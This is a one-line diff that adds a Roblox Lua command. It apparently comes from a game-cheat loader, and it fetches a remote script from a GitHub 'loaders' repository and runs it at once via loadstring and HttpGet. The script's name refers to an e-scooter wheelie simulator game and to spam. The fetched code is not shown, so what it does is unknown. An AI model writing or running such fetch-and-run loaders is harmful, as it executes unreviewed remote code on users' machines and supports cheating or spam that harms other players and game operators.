@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/races-wheelie-a-kukirin-escooter-simulat-spam7-u1ycdxsxodpppk.lua"))()
